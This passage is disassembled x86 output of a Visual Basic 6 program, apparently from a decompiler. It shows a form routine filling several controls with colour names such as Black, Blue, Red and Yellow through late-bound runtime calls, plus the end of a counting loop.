00857C74: add esp, 00000020h
00857C77: push eax
00857C78: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00857C7D: push eax
00857C7E: lea eax, var_38
00857C81: push eax
00857C82: call 00410A84h ; Set (object)
00857C87: push eax
00857C88: lea eax, var_68
00857C8B: push eax
00857C8C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00857C91: add esp, 00000010h
00857C94: push eax
00857C95: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
00857C9A: sub ax, FFFFh
00857C9E: neg ax
00857CA1: sbb eax, eax
00857CA3: inc eax
00857CA4: neg eax
00857CA6: mov var_0000009C, ax
00857CAD: lea eax, var_38
00857CB0: push eax
00857CB1: lea eax, var_34
00857CB4: push eax
00857CB5: lea eax, var_30
00857CB8: push eax
00857CB9: push 00000003h
00857CBB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00857CC0: add esp, 00000010h
00857CC3: lea eax, var_68
00857CC6: push eax
00857CC7: lea eax, var_58
00857CCA: push eax
00857CCB: lea eax, var_48
00857CCE: push eax
00857CCF: push 00000003h
00857CD1: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00857CD6: add esp, 00000010h
00857CD9: movsx eax, word ptr var_0000009C
00857CE0: test eax, eax
00857CE2: jz 857CF3h
00857CE4: mov eax, var_28
00857CE7: add eax, 00000001h
00857CEA: jo 00857E38h
00857CF0: mov var_28, eax
00857CF3: lea eax, var_000000E0
00857CF9: push eax
00857CFA: lea eax, var_000000D0
00857D00: push eax
00857D01: lea eax, var_24
00857D04: push eax
00857D05: call 00410A36h ; Next
00857D0A: mov var_000000F0, eax
00857D10: cmp var_000000F0, 00000000h
00857D17: jnz 00857BC8h
00857D1D: mov eax, [ebp+08h]
00857D20: mov eax, [eax]
00857D22: push [ebp+08h]
00857D25: call [eax+00000328h]
00857D2B: push eax
00857D2C: lea eax, var_30
00857D2F: push eax
00857D30: call 00410A84h ; Set (object)
00857D35: mov var_0000009C, eax
00857D3B: push var_28
00857D3E: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
00857D43: mov edx, eax
00857D45: lea ecx, var_2C
00857D48: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00857D4D: push eax
00857D4E: mov eax, var_0000009C
00857D54: mov eax, [eax]
00857D56: push var_0000009C
00857D5C: call [eax+54h]
00857D5F: fclex 
00857D61: mov var_000000A0, eax
00857D67: cmp var_000000A0, 00000000h
00857D6E: jnl 857D90h
00857D70: push 00000054h
00857D72: push 004425E4h
00857D77: push var_0000009C
00857D7D: push var_000000A0
00857D83: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00857D88: mov var_00000104, eax
00857D8E: jmp 857D97h
00857D90: and var_00000104, 00000000h
00857D97: lea ecx, var_2C
00857D9A: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00857D9F: lea ecx, var_30
00857DA2: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00857DA7: mov var_04, 00000000h
00857DAE: push 00857E19h
00857DB3: jmp 857DEAh
00857DB5: lea ecx, var_2C
00857DB8: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00857DBD: lea eax, var_38
00857DC0: push eax
00857DC1: lea eax, var_34
00857DC4: push eax
00857DC5: lea eax, var_30
00857DC8: push eax
00857DC9: push 00000003h
00857DCB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00857DD0: add esp, 00000010h
00857DD3: lea eax, var_68
00857DD6: push eax
00857DD7: lea eax, var_58
00857DDA: push eax
00857DDB: lea eax, var_48
00857DDE: push eax
00857DDF: push 00000003h
00857DE1: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00857DE6: add esp, 00000010h
00857DE9: ret 
End Sub

Private sub Form__8569DF
008569DF: push ebp
008569E0: mov ebp, esp
008569E2: sub esp, 0000000Ch
008569E5: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008569EA: mov eax, fs:[00h]
008569F0: push eax
008569F1: mov fs:[00000000h], esp
008569F8: push 0000002Ch
008569FA: pop eax
008569FB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856A00: push ebx
00856A01: push esi
00856A02: push edi
00856A03: mov var_0C, esp
00856A06: mov var_08, 0040C8F8h
00856A0D: mov eax, [ebp+08h]
00856A10: and eax, 00000001h
00856A13: mov var_04, eax
00856A16: mov eax, [ebp+08h]
00856A19: and al, FEh
00856A1B: mov [ebp+08h], eax
00856A1E: mov eax, [ebp+08h]
00856A21: mov eax, [eax]
00856A23: push [ebp+08h]
00856A26: call [eax+04h]
00856A29: mov var_20, 00455F10h ; Black
00856A30: mov var_28, 00000008h
00856A37: push 00000010h
00856A39: pop eax
00856A3A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856A3F: lea esi, var_28
00856A42: mov edi, esp
00856A44: movsd 
00856A45: movsd 
00856A46: movsd 
00856A47: movsd 
00856A48: push 00000001h
00856A4A: push 0000000Dh
00856A4C: mov eax, [ebp+08h]
00856A4F: mov eax, [eax]
00856A51: push [ebp+08h]
00856A54: call [eax+0000033Ch]
00856A5A: push eax
00856A5B: lea eax, var_18
00856A5E: push eax
00856A5F: call 00410A84h ; Set (object)
00856A64: push eax
00856A65: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856A6A: add esp, 0000001Ch
00856A6D: lea ecx, var_18
00856A70: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856A75: mov var_20, 00455F20h ; Blue
00856A7C: mov var_28, 00000008h
00856A83: push 00000010h
00856A85: pop eax
00856A86: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856A8B: lea esi, var_28
00856A8E: mov edi, esp
00856A90: movsd 
00856A91: movsd 
00856A92: movsd 
00856A93: movsd 
00856A94: push 00000001h
00856A96: push 0000000Dh
00856A98: mov eax, [ebp+08h]
00856A9B: mov eax, [eax]
00856A9D: push [ebp+08h]
00856AA0: call [eax+0000033Ch]
00856AA6: push eax
00856AA7: lea eax, var_18
00856AAA: push eax
00856AAB: call 00410A84h ; Set (object)
00856AB0: push eax
00856AB1: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856AB6: add esp, 0000001Ch
00856AB9: lea ecx, var_18
00856ABC: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856AC1: mov var_20, 00455F30h ; Cyan
00856AC8: mov var_28, 00000008h
00856ACF: push 00000010h
00856AD1: pop eax
00856AD2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856AD7: lea esi, var_28
00856ADA: mov edi, esp
00856ADC: movsd 
00856ADD: movsd 
00856ADE: movsd 
00856ADF: movsd 
00856AE0: push 00000001h
00856AE2: push 0000000Dh
00856AE4: mov eax, [ebp+08h]
00856AE7: mov eax, [eax]
00856AE9: push [ebp+08h]
00856AEC: call [eax+0000033Ch]
00856AF2: push eax
00856AF3: lea eax, var_18
00856AF6: push eax
00856AF7: call 00410A84h ; Set (object)
00856AFC: push eax
00856AFD: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856B02: add esp, 0000001Ch
00856B05: lea ecx, var_18
00856B08: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856B0D: mov var_20, 00455F40h ; Green
00856B14: mov var_28, 00000008h
00856B1B: push 00000010h
00856B1D: pop eax
00856B1E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856B23: lea esi, var_28
00856B26: mov edi, esp
00856B28: movsd 
00856B29: movsd 
00856B2A: movsd 
00856B2B: movsd 
00856B2C: push 00000001h
00856B2E: push 0000000Dh
00856B30: mov eax, [ebp+08h]
00856B33: mov eax, [eax]
00856B35: push [ebp+08h]
00856B38: call [eax+0000033Ch]
00856B3E: push eax
00856B3F: lea eax, var_18
00856B42: push eax
00856B43: call 00410A84h ; Set (object)
00856B48: push eax
00856B49: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856B4E: add esp, 0000001Ch
00856B51: lea ecx, var_18
00856B54: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856B59: mov var_20, 00455F50h ; Magenta
00856B60: mov var_28, 00000008h
00856B67: push 00000010h
00856B69: pop eax
00856B6A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856B6F: lea esi, var_28
00856B72: mov edi, esp
00856B74: movsd 
00856B75: movsd 
00856B76: movsd 
00856B77: movsd 
00856B78: push 00000001h
00856B7A: push 0000000Dh
00856B7C: mov eax, [ebp+08h]
00856B7F: mov eax, [eax]
00856B81: push [ebp+08h]
00856B84: call [eax+0000033Ch]
00856B8A: push eax
00856B8B: lea eax, var_18
00856B8E: push eax
00856B8F: call 00410A84h ; Set (object)
00856B94: push eax
00856B95: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856B9A: add esp, 0000001Ch
00856B9D: lea ecx, var_18
00856BA0: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856BA5: mov var_20, 00455F64h ; Red
00856BAC: mov var_28, 00000008h
00856BB3: push 00000010h
00856BB5: pop eax
00856BB6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856BBB: lea esi, var_28
00856BBE: mov edi, esp
00856BC0: movsd 
00856BC1: movsd 
00856BC2: movsd 
00856BC3: movsd 
00856BC4: push 00000001h
00856BC6: push 0000000Dh
00856BC8: mov eax, [ebp+08h]
00856BCB: mov eax, [eax]
00856BCD: push [ebp+08h]
00856BD0: call [eax+0000033Ch]
00856BD6: push eax
00856BD7: lea eax, var_18
00856BDA: push eax
00856BDB: call 00410A84h ; Set (object)
00856BE0: push eax
00856BE1: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856BE6: add esp, 0000001Ch
00856BE9: lea ecx, var_18
00856BEC: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856BF1: mov var_20, 00455F70h ; White
00856BF8: mov var_28, 00000008h
00856BFF: push 00000010h
00856C01: pop eax
00856C02: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856C07: lea esi, var_28
00856C0A: mov edi, esp
00856C0C: movsd 
00856C0D: movsd 
00856C0E: movsd 
00856C0F: movsd 
00856C10: push 00000001h
00856C12: push 0000000Dh
00856C14: mov eax, [ebp+08h]
00856C17: mov eax, [eax]
00856C19: push [ebp+08h]
00856C1C: call [eax+0000033Ch]
00856C22: push eax
00856C23: lea eax, var_18
00856C26: push eax
00856C27: call 00410A84h ; Set (object)
00856C2C: push eax
00856C2D: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856C32: add esp, 0000001Ch
00856C35: lea ecx, var_18
00856C38: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856C3D: mov var_20, 00455F80h ; Yellow
00856C44: mov var_28, 00000008h
00856C4B: push 00000010h
00856C4D: pop eax
00856C4E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856C53: lea esi, var_28
00856C56: mov edi, esp
00856C58: movsd 
00856C59: movsd 
00856C5A: movsd 
00856C5B: movsd 
00856C5C: push 00000001h
00856C5E: push 0000000Dh
00856C60: mov eax, [ebp+08h]
00856C63: mov eax, [eax]
00856C65: push [ebp+08h]
00856C68: call [eax+0000033Ch]
00856C6E: push eax
00856C6F: lea eax, var_18
00856C72: push eax
00856C73: call 00410A84h ; Set (object)
00856C78: push eax
00856C79: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856C7E: add esp, 0000001Ch
00856C81: lea ecx, var_18
00856C84: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856C89: mov var_20, 00455F64h ; Red
00856C90: mov var_28, 00000008h
00856C97: push 00000010h
00856C99: pop eax
00856C9A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856C9F: lea esi, var_28
00856CA2: mov edi, esp
00856CA4: movsd 
00856CA5: movsd 
00856CA6: movsd 
00856CA7: movsd 
00856CA8: push 00000000h
00856CAA: mov eax, [ebp+08h]
00856CAD: mov eax, [eax]
00856CAF: push [ebp+08h]
00856CB2: call [eax+0000033Ch]
00856CB8: push eax
00856CB9: lea eax, var_18
00856CBC: push eax
00856CBD: call 00410A84h ; Set (object)
00856CC2: push eax
00856CC3: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00856CC8: lea ecx, var_18
00856CCB: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856CD0: mov var_20, 00455F10h ; Black
00856CD7: mov var_28, 00000008h
00856CDE: push 00000010h
00856CE0: pop eax
00856CE1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856CE6: lea esi, var_28
00856CE9: mov edi, esp
00856CEB: movsd 
00856CEC: movsd 
00856CED: movsd 
00856CEE: movsd 
00856CEF: push 00000001h
00856CF1: push 0000000Dh
00856CF3: mov eax, [ebp+08h]
00856CF6: mov eax, [eax]
00856CF8: push [ebp+08h]
00856CFB: call [eax+00000340h]
00856D01: push eax
00856D02: lea eax, var_18
00856D05: push eax
00856D06: call 00410A84h ; Set (object)
00856D0B: push eax
00856D0C: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856D11: add esp, 0000001Ch
00856D14: lea ecx, var_18
00856D17: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856D1C: mov var_20, 00455F20h ; Blue
00856D23: mov var_28, 00000008h
00856D2A: push 00000010h
00856D2C: pop eax
00856D2D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856D32: lea esi, var_28
00856D35: mov edi, esp
00856D37: movsd 
00856D38: movsd 
00856D39: movsd 
00856D3A: movsd 
00856D3B: push 00000001h
00856D3D: push 0000000Dh
00856D3F: mov eax, [ebp+08h]
00856D42: mov eax, [eax]
00856D44: push [ebp+08h]
00856D47: call [eax+00000340h]
00856D4D: push eax
00856D4E: lea eax, var_18
00856D51: push eax
00856D52: call 00410A84h ; Set (object)
00856D57: push eax
00856D58: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856D5D: add esp, 0000001Ch
00856D60: lea ecx, var_18
00856D63: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856D68: mov var_20, 00455F30h ; Cyan
00856D6F: mov var_28, 00000008h
00856D76: push 00000010h
00856D78: pop eax
00856D79: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856D7E: lea esi, var_28
00856D81: mov edi, esp
00856D83: movsd 
00856D84: movsd 
00856D85: movsd 
00856D86: movsd 
00856D87: push 00000001h
00856D89: push 0000000Dh
00856D8B: mov eax, [ebp+08h]
00856D8E: mov eax, [eax]
00856D90: push [ebp+08h]
00856D93: call [eax+00000340h]
00856D99: push eax
00856D9A: lea eax, var_18
00856D9D: push eax
00856D9E: call 00410A84h ; Set (object)
00856DA3: push eax
00856DA4: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856DA9: add esp, 0000001Ch
00856DAC: lea ecx, var_18
00856DAF: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856DB4: mov var_20, 00455F40h ; Green
00856DBB: mov var_28, 00000008h
00856DC2: push 00000010h
00856DC4: pop eax
00856DC5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856DCA: lea esi, var_28
00856DCD: mov edi, esp
00856DCF: movsd 
00856DD0: movsd 
00856DD1: movsd 
00856DD2: movsd 
00856DD3: push 00000001h
00856DD5: push 0000000Dh
00856DD7: mov eax, [ebp+08h]
00856DDA: mov eax, [eax]
00856DDC: push [ebp+08h]
00856DDF: call [eax+00000340h]
00856DE5: push eax
00856DE6: lea eax, var_18
00856DE9: push eax
00856DEA: call 00410A84h ; Set (object)
00856DEF: push eax
00856DF0: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856DF5: add esp, 0000001Ch
00856DF8: lea ecx, var_18
00856DFB: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856E00: mov var_20, 00455F50h ; Magenta
00856E07: mov var_28, 00000008h
00856E0E: push 00000010h
00856E10: pop eax
00856E11: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856E16: lea esi, var_28
00856E19: mov edi, esp
00856E1B: movsd 
00856E1C: movsd 
00856E1D: movsd 
00856E1E: movsd 
00856E1F: push 00000001h
00856E21: push 0000000Dh
00856E23: mov eax, [ebp+08h]
00856E26: mov eax, [eax]
00856E28: push [ebp+08h]
00856E2B: call [eax+00000340h]
00856E31: push eax
00856E32: lea eax, var_18
00856E35: push eax
00856E36: call 00410A84h ; Set (object)
00856E3B: push eax
00856E3C: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856E41: add esp, 0000001Ch
00856E44: lea ecx, var_18
00856E47: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856E4C: mov var_20, 00455F64h ; Red
00856E53: mov var_28, 00000008h
00856E5A: push 00000010h
00856E5C: pop eax
00856E5D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856E62: lea esi, var_28
00856E65: mov edi, esp
00856E67: movsd 
00856E68: movsd 
00856E69: movsd 
00856E6A: movsd 
00856E6B: push 00000001h
00856E6D: push 0000000Dh
00856E6F: mov eax, [ebp+08h]
00856E72: mov eax, [eax]
00856E74: push [ebp+08h]
00856E77: call [eax+00000340h]
00856E7D: push eax
00856E7E: lea eax, var_18
00856E81: push eax
00856E82: call 00410A84h ; Set (object)
00856E87: push eax
00856E88: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856E8D: add esp, 0000001Ch
00856E90: lea ecx, var_18
00856E93: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856E98: mov var_20, 00455F70h ; White
00856E9F: mov var_28, 00000008h
00856EA6: push 00000010h
00856EA8: pop eax
00856EA9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856EAE: lea esi, var_28
00856EB1: mov edi, esp
00856EB3: movsd 
00856EB4: movsd 
00856EB5: movsd 
00856EB6: movsd 
00856EB7: push 00000001h
00856EB9: push 0000000Dh
00856EBB: mov eax, [ebp+08h]
00856EBE: mov eax, [eax]
00856EC0: push [ebp+08h]
00856EC3: call [eax+00000340h]
00856EC9: push eax
00856ECA: lea eax, var_18
00856ECD: push eax
00856ECE: call 00410A84h ; Set (object)
00856ED3: push eax
00856ED4: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856ED9: add esp, 0000001Ch
00856EDC: lea ecx, var_18
00856EDF: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856EE4: mov var_20, 00455F80h ; Yellow
00856EEB: mov var_28, 00000008h
00856EF2: push 00000010h
00856EF4: pop eax
00856EF5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856EFA: lea esi, var_28
00856EFD: mov edi, esp
00856EFF: movsd 
00856F00: movsd 
00856F01: movsd 
00856F02: movsd 
00856F03: push 00000001h
00856F05: push 0000000Dh
00856F07: mov eax, [ebp+08h]
00856F0A: mov eax, [eax]
00856F0C: push [ebp+08h]
00856F0F: call [eax+00000340h]
00856F15: push eax
00856F16: lea eax, var_18
00856F19: push eax
00856F1A: call 00410A84h ; Set (object)
00856F1F: push eax
00856F20: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856F25: add esp, 0000001Ch
00856F28: lea ecx, var_18
00856F2B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856F30: mov var_20, 00455F10h ; Black
00856F37: mov var_28, 00000008h
00856F3E: push 00000010h
00856F40: pop eax
00856F41: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856F46: lea esi, var_28
00856F49: mov edi, esp
00856F4B: movsd 
00856F4C: movsd 
00856F4D: movsd 
00856F4E: movsd 
00856F4F: push 00000000h
00856F51: mov eax, [ebp+08h]
00856F54: mov eax, [eax]
00856F56: push [ebp+08h]
00856F59: call [eax+00000340h]
00856F5F: push eax
00856F60: lea eax, var_18
00856F63: push eax
00856F64: call 00410A84h ; Set (object)
00856F69: push eax
00856F6A: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00856F6F: lea ecx, var_18
00856F72: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856F77: mov var_20, 00455F10h ; Black
00856F7E: mov var_28, 00000008h
00856F85: push 00000010h
00856F87: pop eax
00856F88: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856F8D: lea esi, var_28
00856F90: mov edi, esp
00856F92: movsd 
00856F93: movsd 
00856F94: movsd 
00856F95: movsd 
00856F96: push 00000001h
00856F98: push 0000000Dh
00856F9A: mov eax, [ebp+08h]
00856F9D: mov eax, [eax]
00856F9F: push [ebp+08h]
00856FA2: call [eax+00000344h]
00856FA8: push eax
00856FA9: lea eax, var_18
00856FAC: push eax
00856FAD: call 00410A84h ; Set (object)
00856FB2: push eax
00856FB3: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00856FB8: add esp, 0000001Ch
00856FBB: lea ecx, var_18
00856FBE: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856FC3: mov var_20, 00455F20h ; Blue
00856FCA: mov var_28, 00000008h
00856FD1: push 00000010h
00856FD3: pop eax
00856FD4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856FD9: lea esi, var_28
00856FDC: mov edi, esp
00856FDE: movsd 
00856FDF: movsd 
00856FE0: movsd 
00856FE1: movsd 
00856FE2: push 00000001h
00856FE4: push 0000000Dh
00856FE6: mov eax, [ebp+08h]
00856FE9: mov eax, [eax]
00856FEB: push [ebp+08h]
00856FEE: call [eax+00000344h]
00856FF4: push eax
00856FF5: lea eax, var_18
00856FF8: push eax
00856FF9: call 00410A84h ; Set (object)
00856FFE: push eax
00856FFF: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00857004: add esp, 0000001Ch
00857007: lea ecx, var_18
0085700A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085700F: mov var_20, 00455F30h ; Cyan
00857016: mov var_28, 00000008h
0085701D: push 00000010h
0085701F: pop eax
00857020: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857025: lea esi, var_28
00857028: mov edi, esp
0085702A: movsd 
0085702B: movsd 
0085702C: movsd 
0085702D: movsd 
0085702E: push 00000001h
00857030: push 0000000Dh
00857032: mov eax, [ebp+08h]
00857035: mov eax, [eax]
00857037: push [ebp+08h]
0085703A: call [eax+00000344h]
00857040: push eax
00857041: lea eax, var_18
00857044: push eax
00857045: call 00410A84h ; Set (object)
0085704A: push eax
0085704B: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00857050: add esp, 0000001Ch
00857053: lea ecx, var_18
00857056: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085705B: mov var_20, 00455F40h ; Green
00857062: mov var_28, 00000008h
00857069: push 00000010h
0085706B: pop eax
0085706C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857071: lea esi, var_28
00857074: mov edi, esp
00857076: movsd 
00857077: movsd 
00857078: movsd 
00857079: movsd 
0085707A: push 00000001h
0085707C: push 0000000Dh
0085707E: mov eax, [ebp+08h]
00857081: mov eax, [eax]
00857083: push [ebp+08h]
00857086: call [eax+00000344h]
0085708C: push eax
0085708D: lea eax, var_18
00857090: push eax
00857091: call 00410A84h ; Set (object)
00857096: push eax
00857097: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0085709C: add esp, 0000001Ch
0085709F: lea ecx, var_18
008570A2: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008570A7: mov var_20, 00455F50h ; Magenta
008570AE: mov var_28, 00000008h
008570B5: push 00000010h
008570B7: pop eax
008570B8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008570BD: lea esi, var_28
008570C0: mov edi, esp
008570C2: movsd 
008570C3: movsd 
008570C4: movsd 
008570C5: movsd 
008570C6: push 00000001h
008570C8: push 0000000Dh
008570CA: mov eax, [ebp+08h]
008570CD: mov eax, [eax]
008570CF: push [ebp+08h]
008570D2: call [eax+00000344h]
008570D8: push eax
008570D9: lea eax, var_18
008570DC: push eax
008570DD: call 00410A84h ; Set (object)
008570E2: push eax
008570E3: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008570E8: add esp, 0000001Ch
008570EB: lea ecx, var_18
008570EE: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008570F3: mov var_20, 00455F64h ; Red
008570FA: mov var_28, 00000008h
00857101: push 00000010h
00857103: pop eax
00857104: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857109: lea esi, var_28
0085710C: mov edi, esp
0085710E: movsd 
0085710F: movsd 
00857110: movsd 
00857111: movsd 
00857112: push 00000001h
00857114: push 0000000Dh
00857116: mov eax, [ebp+08h]
00857119: mov eax, [eax]
0085711B: push [ebp+08h]
0085711E: call [eax+00000344h]
00857124: push eax
00857125: lea eax, var_18
00857128: push eax
00857129: call 00410A84h ; Set (object)
0085712E: push eax
0085712F: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00857134: add esp, 0000001Ch
00857137: lea ecx, var_18
0085713A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085713F: mov var_20, 00455F70h ; White
00857146: mov var_28, 00000008h
0085714D: push 00000010h
0085714F: pop eax
00857150: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857155: lea esi, var_28
00857158: mov edi, esp
0085715A: movsd 
0085715B: movsd 
0085715C: movsd 
0085715D: movsd 
0085715E: push 00000001h
00857160: push 0000000Dh
00857162: mov eax, [ebp+08h]
00857165: mov eax, [eax]
00857167: push [ebp+08h]
0085716A: call [eax+00000344h]
00857170: push eax
00857171: lea eax, var_18
00857174: push eax
00857175: call 00410A84h ; Set (object)
0085717A: push eax
0085717B: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00857180: add esp, 0000001Ch
00857183: lea ecx, var_18
00857186: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085718B: mov var_20, 00455F80h ; Yellow
00857192: mov var_28, 00000008h
00857199: push 00000010h
0085719B: pop eax
0085719C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008571A1: lea esi, var_28
008571A4: mov edi, esp
008571A6: movsd 
008571A7: movsd 
008571A8: movsd 
008571A9: movsd 
008571AA: push 00000001h
008571AC: push 0000000Dh
008571AE: mov eax, [ebp+08h]
008571B1: mov eax, [eax]
008571B3: push [ebp+08h]
008571B6: call [eax+00000344h]
008571BC: push eax
008571BD: lea eax, var_18
008571C0: push eax
008571C1: call 00410A84h ; Set (object)
008571C6: push eax
008571C7: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008571CC: add esp, 0000001Ch
008571CF: lea ecx, var_18
008571D2: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008571D7: mov var_20, 00455F10h ; Black
008571DE: mov var_28, 00000008h
008571E5: push 00000010h
008571E7: pop eax
008571E8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008571ED: lea esi, var_28
008571F0: mov edi, esp
008571F2: movsd 
008571F3: movsd 
008571F4: movsd 
008571F5: movsd 
008571F6: push 00000000h
008571F8: mov eax, [ebp+08h]
008571FB: mov eax, [eax]
008571FD: push [ebp+08h]
00857200: call [eax+00000344h]
00857206: push eax
00857207: lea eax, var_18
0085720A: push eax
0085720B: call 00410A84h ; Set (object)
00857210: push eax
00857211: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00857216: lea ecx, var_18
00857219: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085721E: mov var_20, 00455F10h ; Black
00857225: mov var_28, 00000008h
0085722C: push 00000010h
0085722E: pop eax
0085722F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857234: lea esi, var_28
00857237: mov edi, esp
00857239: movsd 
0085723A: movsd 
0085723B: movsd 
0085723C: movsd 
0085723D: push 00000001h
0085723F: push 0000000Dh
00857241: mov eax, [ebp+08h]
00857244: mov eax, [eax]
00857246: push [ebp+08h]
00857249: call [eax+0000034Ch]
0085724F: push eax
00857250: lea eax, var_18
00857253: push eax
00857254: call 00410A84h ; Set (object)
00857259: push eax
0085725A: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0085725F: add esp, 0000001Ch
00857262: lea ecx, var_18
00857265: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085726A: mov var_20, 00455F20h ; Blue
00857271: mov var_28, 00000008h
00857278: push 00000010h
0085727A: pop eax
0085727B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857280: lea esi, var_28
00857283: mov edi, esp
00857285: movsd 
00857286: movsd 
00857287: movsd 
00857288: movsd 
00857289: push 00000001h
0085728B: push 0000000Dh
0085728D: mov eax, [ebp+08h]
00857290: mov eax, [eax]
00857292: push [ebp+08h]
00857295: call [eax+0000034Ch]
0085729B: push eax
0085729C: lea eax, var_18
0085729F: push eax
008572A0: call 00410A84h ; Set (object)
008572A5: push eax
008572A6: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008572AB: add esp, 0000001Ch
008572AE: lea ecx, var_18
008572B1: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008572B6: mov var_20, 00455F30h ; Cyan
008572BD: mov var_28, 00000008h
008572C4: push 00000010h
008572C6: pop eax
008572C7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008572CC: lea esi, var_28
008572CF: mov edi, esp
008572D1: movsd 
008572D2: movsd 
008572D3: movsd 
008572D4: movsd 
008572D5: push 00000001h
008572D7: push 0000000Dh
008572D9: mov eax, [ebp+08h]
008572DC: mov eax, [eax]
008572DE: push [ebp+08h]
008572E1: call [eax+0000034Ch]
008572E7: push eax
008572E8: lea eax, var_18
008572EB: push eax
008572EC: call 00410A84h ; Set (object)
008572F1: push eax
008572F2: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008572F7: add esp, 0000001Ch
008572FA: lea ecx, var_18
